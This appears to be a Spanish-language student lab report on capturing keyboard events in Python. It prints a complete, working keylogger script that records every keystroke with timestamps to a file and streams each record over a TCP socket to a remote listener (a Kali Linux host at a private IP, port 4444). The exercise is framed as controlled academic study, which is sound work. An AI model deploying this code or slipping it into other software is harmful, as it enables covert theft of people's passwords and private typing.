Parcial 1 · Actividad 03

No presiones Esc… todavía

Ejercicio de seguridad informática orientado a comprender, desde el lado defensivo, cómo funciona la captura de eventos de entrada a nivel de sistema operativo: la base técnica de amenazas como los keyloggers y de las estrategias para detectarlas.

01

Introducción

En esta práctica se implementó un programa en Python utilizando la librería pynput para capturar eventos de teclado en un entorno controlado de laboratorio. El propósito fue comprender cómo funcionan los event hooks y callbacks, así como explorar el envío de registros hacia una máquina Kali Linux mediante sockets TCP. Esta actividad se relaciona con el concepto de keylogging, el cual, aunque puede ser usado de forma maliciosa, aquí se estudia con fines académicos y de aprendizaje en ciberseguridad.

02

Objetivo

El objetivo principal de la práctica fue desarrollar y documentar un programa que registre eventos de teclado, los asocie temporalmente y transmita la información hacia un receptor en Kali Linux, con el fin de analizar su funcionamiento técnico y reflexionar sobre sus implicaciones en seguridad informática.

03

Código

act3.py 
from pynput import keyboard

import socket
from pynput.keyboard import Key, Listener
from datetime import datetime

# Configuración de conexión hacia Kali
HOST = "192.168.1.75"  
PORT = 4444

# Crear archivo vacío al inicios
with open("Caracteres.txt", "w", encoding="utf-8") as file:
    file.write("Registro de eventos iniciado\n")

# Crear socket y conectar a Kali
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

i = 0

def registrar_evento(tipo, tecla):
    global i
    i += 1
    fecha_formateada = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    registro = f"{fecha_formateada} | {tipo} | {tecla} | evento_{i:03d}\n"
    
    # Persistencia local
    with open("Caracteres.txt", "a", encoding="utf-8") as file:
        file.write(registro)
    
    # Envío a Kali
    try:
        sock.sendall(registro.encode())
    except Exception as e:
        print(f"Error al enviar: {e}")

def on_press(key):
    try:
        tecla = key.char
    except AttributeError:
        tecla = str(key)
    registrar_evento("PRESS", tecla)

def on_release(key):
    registrar_evento("RELEASE", str(key))
    if key == Key.esc:
        sock.close()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
04

Conceptos principales

  • Event hooks: mecanismos que permiten interceptar la entrada del teclado.
  • Callbacks: funciones que procesan cada evento capturado.
  • Persistencia de registros: almacenamiento de los eventos en un archivo local (Caracteres.txt).
  • Sockets TCP: protocolo de comunicación usado para enviar los registros a Kali Linux.
  • Keylogging: técnica de captura de teclas, estudiada aquí en un entorno académico para comprender riesgos y defensas.
05

Aprendizajes obtenidos

Comprender cómo interceptar y procesar eventos de teclado en Python.

Implementar persistencia de registros con fecha, hora y un identificador único por evento.

Configurar la comunicación entre Windows y Kali Linux mediante sockets TCP.

Reconocer la relación entre estas técnicas y el concepto de keylogging.

Reflexionar sobre la importancia de aplicar medidas de protección frente a posibles usos maliciosos.

06

Conclusión

Al realizar esta práctica comprendí de manera más clara cómo funcionan los event hooks y callbacks en Python, y cómo se pueden aprovechar para capturar y procesar eventos de teclado. Me resultó interesante ver que cada tecla podía registrarse con precisión en un archivo y, además, transmitirse hacia otra máquina como Kali Linux. Esto me permitió experimentar con la comunicación entre sistemas y entender mejor los riesgos asociados a técnicas como el keylogging.

El uso de pynput facilitó la comprensión de la programación orientada a eventos y de cómo el sistema operativo expone los eventos de entrada a nivel de aplicación.

Como aprendizaje principal, se destaca que capacidades técnicamente sencillas —como escuchar eventos de teclado— pueden convertirse en un riesgo relevante si se combinan con persistencia y transmisión no autorizada; estudiarlas en un entorno controlado y ético permite fortalecer los criterios de detección y defensa frente a amenazas de este tipo.
